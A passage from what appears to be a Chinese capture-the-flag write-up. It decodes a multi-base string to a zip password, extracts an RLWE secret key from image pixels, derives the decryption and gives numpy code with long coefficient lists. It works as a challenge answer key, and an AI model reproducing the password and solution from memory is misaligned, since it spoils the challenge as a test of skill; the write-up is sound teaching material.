55721043545237639, 239916744182811448, 134638877854791156, 76687455444928683, 3051612621194354938, 4253947515818696559, 392166402534779315, 5415521347314633, 1816697745794261287, 2282876916808180261, 3667412627019328976, 4211876289328416715, 1647128252024708114, 3721877072126461741, 2297068963395433648, 398583411660274597, 3562855580894975650, 1322989240042277117, 3551729861626536144, 2816759739903316271, 2629395545611893101, 1799561289667084873, 2629410111371391637, 1398369600901640698, 447266788926484707, 405213767544537836, 3014220918160576578, 747208265285548041, 1727187447678753569, 3063564852472463780, 1502638600503176791, 3284205888928186113, 3412854446691461073, 3937011809364193960, 1208514509487198642, 3063044796627572289, 2532417142719581087, 375928502591586817, 2839325684818922862, 4472409225244809142, 1384186637673587546, 1680318030162086049]</span></span><br><span class="line"><span class="string">t = [3482937270284373504, 3729542463939501056, 1354530592839269376, 2340035975483411456, 3318144666530505728, 4321971466042776576, 4107840020098758656, 2600042509314867200, 3185315495632337920, 2510425761632839680, 3758844697217568768, 1813627045100445696, 1035634427310004224, 1650895865179787264, 931858574122051584, 3821738968282525696, 751354306590687232, 812159733109825536, 1984846083975063552, 426674528748978176, 1786129270688538624, 53204613942820864, 4207648582990901248, 2441413890227052544, 4573249524143439872, 2901255116891488256, 3331287389413953536, 1594453621617430528, 7636565623463936, 3261865719383670784, 3211543945355886592, 4414864510393499648, 1781787468450406400, 4381257290165919744, 1683943310183464960, 1618102318685454336, 3082727664554508288, 1284750602156802048, 4536273674447527936, 4224428964375134208, 1990811212107251712, 220641709431201792, 56727929599156224, 1394394833783595008, 474539825790402560, 2367070412709519360, 86013256530493440, 3983263247386468352, 4488230536002330624, 1131832099054157824, 4470326732790874112, 2361104703887433728, 1850267988673478656, 519014833878171648, 2447115942472581120, 2567048274520276992, 3409815404144214016, 2569012418791473152, 2239861171203006464, 3207035079062069248, 1423032481934245888, 3660676895628648448, 3197924030326439936, 2173721402472767488, 1836499846562930688, 1193190307175825408, 2757965850888388608, 3833547905923039232, 113362523505639424, 2095507640221974528, 695818728283136000, 2746136108677742592, 80271849461956608, 544596706215608320, 857894362373431296, 1801819582386577408, 2748888436946362368, 1760827740054806528, 2544591920627023872, 4324861829346312192, 3073160513540464640, 3260750497480876032, 1268136159796920320, 2738758060057362432, 460370852221685760, 3694812482865025024, 674485732026892288, 31827325234905088, 1076067066569760768, 3538749128687951872, 4553745898606747648, 3332219178735149056, 329835532944998400, 4576690061027602432, 3023286444576161792, 1797946474203955200, 4558389623053447168, 1790588264296259584, 3017170271014150144, 991463616551034880, 1940023178234544128, 3414390445152993280, 644333657859764224, 3692106158122917888, 3167684436092710912, 789204772426006528, 4353661356398166016, 2000540208800374784, 3942168043465134080, 3332450567729246208, 2627875622523490304, 9371534919516160, 848644069081235456, 2192689498702295040, 907016265148577792, 2645935549696630784, 2590866188404383744, 3750676748846913536, 3694849270404139008, 4268369840164233216, 3556945000413347840, 1995615102316576768, 4445424004994387968, 2929133498761163776, 2462149674675616768, 741748174115656704, 39754566828455680, 4477497218304360448]</span></span><br><span class="line"><span class="string">jjgqJn00BoV2m68QERWUCmah8h86UJERRsVhfzEzy9hBwi0GJ5MyEzBCQS5r0yr7GrdM5d0ptnBWLzfywakvSlRJvex1efrtHiDVNo4WQZjopk4N3RFi4D</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>先解最后的base，base62-base32-base58-base64-base62解得 <code>wo_shi_yhhhh_de_fen_si</code>。</p><p>用此作为密码解压得到一个 s.png，提取像素值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;YOUQU/s.png&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        tmp = img.getpixel((i,j))</span><br><span class="line">        s.append(tmp)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = [1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1]</span></span><br></pre></td></tr></table></figure><p>加密部分是一个RLWE，定义了一个多项式商环 $F_p[x]=\cfrac{Z_p[x]}{f(x)}$，随机列表为商环上的多项式系数列表。</p><p>加密函数</p><p>$t(x) \equiv -s(x)g(x)+e_1(x) \pmod p$</p><p>$w(x) \equiv t(x)r(x)+e_2(x)+d\cdot m(x) \pmod p$</p><p>$v(x) \equiv g(x)r(x)+e_3(x) \pmod p$</p><p>已知私钥 $s(x)$，则</p><p>$w+s\cdot v=(t\cdot r+e_2+d\cdot m)+s(g\cdot r+e_3)=-s\cdot g\cdot r+e_1\cdot r+e_2+d\cdot m+s\cdot g\cdot r+s\cdot e_3=d\cdot m+(e_1\cdot r+e_2+s\cdot e_3)$</p><p>可以发现，后面的 $e\cdot r+e_2+s\cdot e_3$ 仍然是个小噪声， 有</p><p>$(w+s\cdot v) \bmod d = m$</p><p>噪声可能满足 $e_1\cdot r+e_2+s\cdot e_3&lt;0$ ，为负值的时候，会出现 $(w+s\cdot v) \bmod d = m&lt;1$ ，需对应处理。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> numpy.polynomial <span class="keyword">import</span> polynomial <span class="keyword">as</span> poly</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polymul(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">x, y, z, mod</span>):</span><br><span class="line">    init_poly = poly.polyadd(x, y)</span><br><span class="line">    res_poly = poly.polydiv(init_poly % z, mod)[<span class="number">1</span>] % z</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.<span class="built_in">round</span>(res_poly))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, <span class="number">2</span>, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">qz</span>(<span class="params">z, lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.random.randint(<span class="number">0</span>, z, lenth1, dtype=np.int64)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guess</span>(<span class="params">lenth1</span>):</span><br><span class="line">    <span class="keyword">return</span> np.int64(np.random.normal(<span class="number">0</span>, <span class="number">2</span>, size=lenth1))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jlkey</span>(<span class="params">lenth1, z, mod</span>):</span><br><span class="line">    s = q2(lenth1)</span><br><span class="line">    g = qz(z, lenth1)</span><br><span class="line">    e1 = guess(lenth1)</span><br><span class="line">    t = add(mul(g, s, z, mod), e1, z, mod)</span><br><span class="line">    key = [g, t, s]</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jl</span>(<span class="params">key, length1, n, p, mod, msg</span>):</span><br><span class="line">    jlm = []</span><br><span class="line">    mm = <span class="built_in">hex</span>(msg)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(mm)):</span><br><span class="line">        jlm.append(<span class="built_in">ord</span>(mm[i]))</span><br><span class="line"></span><br><span class="line">    m = np.array(jlm + [<span class="number">0</span>] * (length1 - <span class="built_in">len</span>(jlm)), dtype=np.int64) % p</span><br><span class="line">    d = n // p</span><br><span class="line">    dm = d * m % n</span><br><span class="line">    e2 = guess(length1)</span><br><span class="line">    e3 = guess(length1)</span><br><span class="line">    r = q2(length1)</span><br><span class="line">    g = key[<span class="number">0</span>]</span><br><span class="line">    t = key[<span class="number">1</span>]</span><br><span class="line">    w = add(add(mul(t, r, n, mod), e2, n, mod), dm, n, mod)</span><br><span class="line">    v = add(mul(g, r, n, mod), e3, n, mod)</span><br><span class="line">    c = [w, v]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line">o = <span class="number">128</span></span><br><span class="line">n = <span class="number">2</span> ** <span class="number">62</span></span><br><span class="line">p = <span class="number">2</span> ** <span class="number">32</span></span><br><span class="line">mod = np.array([<span class="number">1</span>] + [<span class="number">0</span>] * (o - <span class="number">1</span>) + [<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">w = [<span class="number">4456121292753321984</span>, <span class="number">2695388220323384832</span>, <span class="number">1125798304404134912</span>, <span class="number">1389165333028469760</span>, <span class="number">3720515311443086336</span>, <span class="number">1806160162087117824</span>, <span class="number">1710165564223285248</span>, <span class="number">3854525633894178816</span>, <span class="number">4160032803226148864</span>, <span class="number">3223993978734964736</span>, <span class="number">188029029972998144</span>, <span class="number">2283288149728718848</span>, <span class="number">178098730553155584</span>, <span class="number">400166020473782272</span>, <span class="number">4426677526375129088</span>, <span class="number">1768526165797007360</span>, <span class="number">4596103848246980608</span>, <span class="number">3143341953117548544</span>, <span class="number">4113813229295153152</span>, <span class="number">1444787342796136448</span>, <span class="number">1749143783191330816</span>, <span class="number">601663717837410304</span>, <span class="number">1976180375223943168</span>, <span class="number">899486064067571712</span>, <span class="number">2467702122158211072</span>, <span class="number">1442313048691163136</span>, <span class="number">2977506408218411008</span>, <span class="number">1106991111199326208</span>, <span class="number">844904722420957184</span>, <span class="number">1013497211561496576</span>, <span class="number">4250614525386129408</span>, <span class="number">1677797764964532224</span>, <span class="number">4212901529405988864</span>, <span class="number">2561734724771299328</span>, <span class="number">1890807629146202112</span>, <span class="number">951039123411230720</span>, <span class="number">881428262835757056</span>, <span class="number">514344970914586624</span>, <span class="number">3072465238399721472</span>, <span class="number">1294633561516974080</span>, <span class="number">4471068621313253376</span>, <span class="number">2978038764905480192</span>, <span class="number">1256294011046658048</span>, <span class="number">2885789906784919552</span>, <span class="number">1808546586690191360</span>, <span class="number">3846883621647482880</span>, <span class="number">422980376119787520</span>, <span class="number">3401510714240147456</span>, <span class="number">3024926897503240192</span>, <span class="number">3504641379026477056</span>, <span class="number">2686993749796929536</span>, <span class="number">4084804987293286400</span>, <span class="number">1949654215988994048</span>, <span class="number">2949577339713200128</span>, <span class="number">2514172581835300864</span>, <span class="number">614361226066452480</span>, <span class="number">1560522408220647424</span>, <span class="number">1215782736092413952</span>, <span class="number">1705607337158410240</span>, <span class="number">3789095360729792512</span>, <span class="number">126768310879952896</span>, <span class="number">3564560282876477440</span>, <span class="number">4112635401656336384</span>, <span class="number">488963213586022400</span>, <span class="number">3263989278014881792</span>, <span class="number">1190526290525741056</span>, <span class="number">3726804923972673536</span>, <span class="number">2773020963465314304</span>, <span class="number">2008550394681090048</span>, <span class="number">2877753734522249216</span>, <span class="number">3318721688589254656</span>, <span class="number">2685195110085615616</span>, <span class="number">2120287225013829632</span>, <span class="number">2837075008393977856</span>, <span class="number">680647261446750208</span>, <span class="number">2672034759831756800</span>, <span class="number">586790221783564288</span>, <span class="number">4413791420559310848</span>, <span class="number">753748175057453056</span>, <span class="number">4156435215025135616</span>, <span class="number">1753634903657668608</span>, <span class="number">3868573500772638720</span>, <span class="number">1065381465124585472</span>, <span class="number">1951729611177713664</span>, <span class="number">833463289401663488</span>, <span class="number">3083559584672243712</span>, <span class="number">2453364017450852352</span>, <span class="number">3187954181254758400</span>, <span class="number">2701962603281113088</span>, <span class="number">1657135743981748224</span>, <span class="number">3393942972234113024</span>, <span class="number">3224375546132267008</span>, <span class="number">1637663670848045056</span>, <span class="number">2226464092285288448</span>, <span class="number">3426678970486587392</span>, <span class="number">3746864906767974400</span>, <span class="number">892187878069846016</span>, <span class="number">1566105953383768064</span>, <span class="number">1841796609436766208</span>, <span class="number">102854404605427712</span>, <span class="number">1384852880673484800</span>, <span class="number">2187150610629812224</span>, <span class="number">3960839367218393088</span>, <span class="number">798293770690805760</span>, <span class="number">172119736121323520</span>, <span class="number">2434320282093170688</span>, <span class="number">3398926147058458624</span>, <span class="number">858963714965422080</span>, <span class="number">3371154991043334144</span>, <span class="number">1537312801335345152</span>, <span class="number">2963315646558453760</span>, <span class="number">4058550201296797696</span>, <span class="number">1544831164568528896</span>, <span class="number">4296983781331357696</span>, <span class="number">3597399236973740032</span>, <span class="number">1172234645379473408</span>, <span class="number">1811007296491237376</span>, <span class="number">1364782914640955392</span>, <span class="number">1942828798540959744</span>, <span class="number">1312644494190576640</span>, <span class="number">540671172853423104</span>, <span class="number">2521681537802540032</span>, <span class="number">3678999552996606976</span>, <span class="number">3522586936321518592</span>, <span class="number">3355286245326997504</span>, <span class="number">1724989423167225856</span>, <span class="number">2857616461138001920</span>, <span class="number">3550411157752463360</span>]</span><br><span class="line">v = [<span class="number">3004075223514152960</span>, <span class="number">375766571298967040</span>, <span class="number">3918175633582001664</span>, <span class="number">298998053399571840</span>, <span class="number">4539733962165100544</span>, <span class="number">3415675319003214848</span>, <span class="number">557497174827461120</span>, <span class="number">1187181217327680512</span>, <span class="number">42761045408950272</span>, <span class="number">4539692406094923776</span>, <span class="number">3474777010512353280</span>, <span class="number">807990709249906688</span>, <span class="number">4401927180657766400</span>, <span class="number">628439373724332032</span>, <span class="number">3552565694197467136</span>, <span class="number">1229559664627433472</span>, <span class="number">2735485480783970304</span>, <span class="number">340251515454152704</span>, <span class="number">535029869298274304</span>, <span class="number">1089634905489248256</span>, <span class="number">1745435675342262272</span>, <span class="number">2211405319829864448</span>, <span class="number">3166387633265565696</span>, <span class="number">3356595592575791104</span>, <span class="number">811586262403354624</span>, <span class="number">1658544963444764672</span>, <span class="number">2801381922146680832</span>, <span class="number">1906405005677551616</span>, <span class="number">2764661089781948416</span>, <span class="number">348852661152833536</span>, <span class="number">2843732326950182912</span>, <span class="number">3655220640882900992</span>, <span class="number">2735228541582770176</span>, <span class="number">984245520265568256</span>, <span class="number">847631674608009216</span>, <span class="number">4278557074339209216</span>, <span class="number">354445030770749440</span>, <span class="number">552426514839019520</span>, <span class="number">3037890003690143744</span>, <span class="number">3845527152479436800</span>, <span class="number">686613871844605952</span>, <span class="number">1987014853275738112</span>, <span class="number">129221415412514816</span>, <span class="number">884028654840045568</span>, <span class="number">893161048767537152</span>, <span class="number">4428861422755028992</span>, <span class="number">1977654893495033856</span>, <span class="number">2683055322869915648</span>, <span class="number">4466344498597339136</span>, <span class="number">2820131774980661248</span>, <span class="number">2105607478169853952</span>, <span class="number">768444766180638720</span>, <span class="number">212987987936600064</span>, <span class="number">1576117523911901184</span>, <span class="number">1650389830627762176</span>, <span class="number">1915750840791851008</span>, <span class="number">4109009172913405952</span>, <span class="number">2218053892260061184</span>, <span class="number">3863963349465956352</span>, <span class="number">2990430210085863424</span>, <span class="number">1274030477779271680</span>, <span class="number">1711547929466978304</span>, <span class="number">1157679433574768640</span>, <span class="number">156097645996949504</span>, <span class="number">3695677787747401728</span>, <span class="number">4322888783310766080</span>, <span class="number">4546024412016992256</span>, <span class="number">2655974462028947456</span>, <span class="number">1604656974594400256</span>, <span class="number">2045021548923273216</span>, <span class="number">3161689730583207936</span>, <span class="number">8339332591755263</span>, <span class="number">2341948229963612160</span>, <span class="number">3607706207127453696</span>, <span class="number">469234496887414784</span>, <span class="number">973715854261501952</span>, <span class="number">789210633607102464</span>, <span class="number">4424949506055979008</span>, <span class="number">1542517731370860544</span>, <span class="number">182468406585786368</span>, <span class="number">1807090988320792576</span>, <span class="number">1850374377172516864</span>, <span class="number">2618527682038956032</span>, <span class="number">1262867559425187840</span>, <span class="number">938222240300924928</span>, <span class="number">4591256432328728576</span>, <span class="number">2044671823654682624</span>, <span class="number">3467964150293766144</span>, <span class="number">79543117595951104</span>, <span class="number">2185630104198291456</span>, <span class="number">3728244444110430208</span>, <span class="number">156056289984327680</span>, <span class="number">4390349499275018240</span>, <span class="number">1751182369256157184</span>, <span class="number">2162985531302232064</span>, <span class="number">2761554017168584704</span>, <span class="number">2829764058526203904</span>, <span class="number">2028689816016191488</span>, <span class="number">146286463995781120</span>, <span class="number">3720834471976288256</span>, <span class="number">2917463735459491840</span>, <span class="number">4566476477728677888</span>, <span class="number">3722002688823242752</span>, <span class="number">4245856959119122432</span>, <span class="number">3425954365963665408</span>, <span class="number">3618936531494342656</span>, <span class="number">3695636186696466432</span>, <span class="number">1423352273706041344</span>, <span class="number">158921080583421952</span>, <span class="number">4351926341975711744</span>, <span class="number">3376292832678187008</span>, <span class="number">3295795181429579776</span>, <span class="number">3267875754319810560</span>, <span class="number">2363850527793784832</span>, <span class="number">888488262224822272</span>, <span class="number">1097387081646508032</span>, <span class="number">3686827109357189120</span>, <span class="number">297511993689784320</span>, <span class="number">3698586652027076608</span>, <span class="number">1126524981060736000</span>, <span class="number">1227462499250052096</span>, <span class="number">195965752955788032</span>, <span class="number">378621325977167872</span>, <span class="number">4568860371418834944</span>, <span class="number">3806982850127191040</span>, <span class="number">2330191690590402560</span>, <span class="number">965690431040995328</span>, <span class="number">2254601344237207552</span>]</span><br><span class="line">g = [<span class="number">1271385667288255999</span>, <span class="number">3597939031086288160</span>, <span class="number">948720385886874982</span>, <span class="number">3730034896312885091</span>, <span class="number">155961058571645646</span>, <span class="number">873298702409407364</span>, <span class="number">3695415802847080551</span>, <span class="number">3935805697420664465</span>, <span class="number">303427777773526115</span>, <span class="number">2121504102169723388</span>, <span class="number">3117842710535023914</span>, <span class="number">2004730725267082784</span>, <span class="number">315298886702225235</span>, <span class="number">711790101004272712</span>, <span class="number">3469726824196756845</span>, <span class="number">3649946521480214795</span>, <span class="number">4269586158067475466</span>, <span class="number">1607685984041888423</span>, <span class="number">1866766258134518609</span>, <span class="number">4115571819844332380</span>, <span class="number">2381299916655519619</span>, <span class="number">2208948036365614734</span>, <span class="number">1946214530009282102</span>, <span class="number">330799912617809735</span>, <span class="number">3460498231343524429</span>, <span class="number">2694359423578749492</span>, <span class="number">793704330311549271</span>, <span class="number">1491532600134534859</span>, <span class="number">1606672420502700650</span>, <span class="number">561106526228105342</span>, <span class="number">1105025457886824442</span>, <span class="number">1443932433209975334</span>, <span class="number">4240908184445005305</span>, <span class="number">1954646486670721382</span>, <span class="number">4227369777555389059</span>, <span class="number">1563814260527576306</span>, <span class="number">771217858163031033</span>, <span class="number">1280424786084049063</span>, <span class="number">303853418224126180</span>, <span class="number">181918673882271714</span>, <span class="number">2212581027220765469</span>, <span class="number">2111888312694611250</span>, <span class="number">3581354821166105988</span>, <span class="number">1429049683930421764</span>, <span class="number">1357441041735699015</span>, <span class="number">3553280165847887597</span>, <span class="number">869489768651033960</span>, <span class="number">1107714765447012644</span>, <span class="number">2910143081602408601</span>, <span class="number">1433461290183315706</span>, <span class="number">3240132019514117541</span>, <span class="number">2465292834002904411</span>, <span class="number">1334470694725903257</span>, <span class="number">3156578894981065904</span>, <span class="number">35185442949043438</span>, <span class="number">645993467993501426</span>, <span class="number">1352915688916657829</span>, <span class="number">1521946784078789166</span>, <span class="number">2639858512187877401</span>, <span class="number">4315064694485922395</span>, <span class="number">3953315792354490874</span>, <span class="number">1587769214913102261</span>, <span class="number">3912000075342935904</span>, <span class="number">1887499577531299413</span>, <span class="number">309657057763429254</span>, <span class="number">769590223035802807</span>, <span class="number">4361036733963754384</span>, <span class="number">1446528785602732156</span>, <span class="number">1205711736426995533</span>, <span class="number">3683188791797133788</span>, <span class="number">921287773622604679</span>, <span class="number">3591274357626650529</span>, <span class="number">2745859155549230842</span>, <span class="number">4491978210538609848</span>, <span class="number">2444128709624329128</span>, <span class="number">1403888264551474491</span>, <span class="number">4377727165055311964</span>, <span class="number">1507498290240201527</span>, <span class="number">2952796830041690744</span>, <span class="number">1642562262970195060</span>, <span class="number">2847743992975447391</span>, <span class="number">4164239208310834247</span>, <span class="number">1967003682977431435</span>, <span class="number">2575799088251274004</span>, <span class="number">156708464748056204</span>, <span class="number">2403917842083313594</span>, <span class="number">55721043545237639</span>, <span class="number">239916744182811448</span>, <span class="number">134638877854791156</span>, <span class="number">76687455444928683</span>, <span class="number">3051612621194354938</span>, <span class="number">4253947515818696559</span>, <span class="number">392166402534779315</span>, <span class="number">5415521347314633</span>, <span class="number">1816697745794261287</span>, <span class="number">2282876916808180261</span>, <span class="number">3667412627019328976</span>, <span class="number">4211876289328416715</span>, <span class="number">1647128252024708114</span>, <span class="number">3721877072126461741</span>, <span class="number">2297068963395433648</span>, <span class="number">398583411660274597</span>, <span class="number">3562855580894975650</span>, <span class="number">1322989240042277117</span>, <span class="number">3551729861626536144</span>, <span class="number">2816759739903316271</span>, <span class="number">2629395545611893101</span>, <span class="number">1799561289667084873</span>, <span class="number">2629410111371391637</span>, <span class="number">1398369600901640698</span>, <span class="number">447266788926484707</span>, <span class="number">405213767544537836</span>, <span class="number">3014220918160576578</span>, <span class="number">747208265285548041</span>, <span class="number">1727187447678753569</span>, <span class="number">3063564852472463780</span>, <span class="number">1502638600503176791</span>, <span class="number">3284205888928186113</span>, <span class="number">3412854446691461073</span>, <span class="number">3937011809364193960</span>, <span class="number">1208514509487198642</span>, <span class="number">3063044796627572289</span>, <span class="number">2532417142719581087</span>, <span class="number">375928502591586817</span>, <span class="number">2839325684818922862</span>, <span class="number">4472409225244809142</span>, <span class="number">1384186637673587546</span>, <span class="number">1680318030162086049</span>]</span><br><span class="line">t = [<span class="number">3482937270284373504</span>, <span class="number">3729542463939501056</span>, <span class="number">1354530592839269376</span>, <span class="number">2340035975483411456</span>, <span class="number">3318144666530505728</span>, <span class="number">4321971466042776576</span>, <span class="number">4107840020098758656</span>, <span class="number">2600042509314867200</span>, <span class="number">3185315495632337920</span>, <span class="number">2510425761632839680</span>, <span class="number">3758844697217568768</span>, <span class="number">1813627045100445696</span>, <span class="number">1035634427310004224</span>, <span class="number">1650895865179787264</span>, <span class="number">931858574122051584</span>, <span class="number">3821738968282525696</span>, <span class="number">751354306590687232</span>, <span class="number">812159733109825536</span>, <span class="number">1984846083975063552</span>, <span class="number">426674528748978176</span>, <span class="number">1786129270688538624</span>, <span class="number">53204613942820864</span>, <span class="number">4207648582990901248</span>, <span class="number">2441413890227052544</span>, <span class="number">4573249524143439872</span>, <span class="number">2901255116891488256</span>, <span class="number">3331287389413953536</span>, <span class="number">1594453621617430528</span>, <span class="number">7636565623463936</span>, <span class="number">3261865719383670784</span>, <span class="number">3211543945355886592</span>, <span class="number">4414864510393499648</span>, <span class="number">1781787468450406400</span>, <span class="number">4381257290165919744</span>, <span class="number">1683943310183464960</span>, <span class="number">1618102318685454336</span>, <span class="number">3082727664554508288</span>, <span class="number">1284750602156802048</span>, <span class="number">4536273674447527936</span>, <span class="number">4224428964375134208</span>, <span class="number">1990811212107251712</span>, <span class="number">220641709431201792</span>, <span class="number">56727929599156224</span>, <span class="number">1394394833783595008</span>, <span class="number">474539825790402560</span>, <span class="number">2367070412709519360</span>, <span class="number">86013256530493440</span>, <span class="number">3983263247386468352</span>, <span class="number">4488230536002330624</span>, <span class="number">1131832099054157824</span>, <span class="number">4470326732790874112</span>, <span class="number">2361104703887433728</span>, <span class="number">1850267988673478656</span>, <span class="number">519014833878171648</span>, <span class="number">2447115942472581120</span>, <span class="number">2567048274520276992</span>, <span class="number">3409815404144214016</span>, <span class="number">2569012418791473152</span>, <span class="number">2239861171203006464</span>, <span class="number">3207035079062069248</span>, <span class="number">1423032481934245888</span>, <span class="number">3660676895628648448</span>, <span class="number">3197924030326439936</span>, <span class="number">2173721402472767488</span>, <span class="number">1836499846562930688</span>, <span class="number">1193190307175825408</span>, <span class="number">2757965850888388608</span>, <span class="number">3833547905923039232</span>, <span class="number">113362523505639424</span>, <span class="number">2095507640221974528</span>, <span class="number">695818728283136000</span>, <span class="number">2746136108677742592</span>, <span class="number">80271849461956608</span>, <span class="number">544596706215608320</span>, <span class="number">857894362373431296</span>, <span class="number">1801819582386577408</span>, <span class="number">2748888436946362368</span>, <span class="number">1760827740054806528</span>, <span class="number">2544591920627023872</span>, <span class="number">4324861829346312192</span>, <span class="number">3073160513540464640</span>, <span class="number">3260750497480876032</span>, <span class="number">1268136159796920320</span>, <span class="number">2738758060057362432</span>, <span class="number">460370852221685760</span>, <span class="number">3694812482865025024</span>, <span class="number">674485732026892288</span>, <span class="number">31827325234905088</span>, <span class="number">1076067066569760768</span>, <span class="number">3538749128687951872</span>, <span class="number">4553745898606747648</span>, <span class="number">3332219178735149056</span>, <span class="number">329835532944998400</span>, <span class="number">4576690061027602432</span>, <span class="number">3023286444576161792</span>, <span class="number">1797946474203955200</span>, <span class="number">4558389623053447168</span>, <span class="number">1790588264296259584</span>, <span class="number">3017170271014150144</span>, <span class="number">991463616551034880</span>, <span class="number">1940023178234544128</span>, <span class="number">3414390445152993280</span>, <span class="number">644333657859764224</span>, <span class="number">3692106158122917888</span>, <span class="number">3167684436092710912</span>, <span class="number">789204772426006528</span>, <span class="number">4353661356398166016</span>, <span class="number">2000540208800374784</span>, <span class="number">3942168043465134080</span>, <span class="number">3332450567729246208</span>, <span class="number">2627875622523490304</span>, <span class="number">9371534919516160</span>, <span class="number">848644069081235456</span>, <span class="number">2192689498702295040</span>, <span class="number">907016265148577792</span>, <span class="number">2645935549696630784</span>, <span class="number">2590866188404383744</span>, <span class="number">3750676748846913536</span>, <span class="number">3694849270404139008</span>, <span class="number">4268369840164233216</span>, <span class="number">3556945000413347840</span>, <span class="number">1995615102316576768</span>, <span class="number">4445424004994387968</span>, <span class="number">2929133498761163776</span>, <span class="number">2462149674675616768</span>, <span class="number">741748174115656704</span>, <span class="number">39754566828455680</span>, <span class="number">4477497218304360448</span>]</span><br><span class="line">s = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 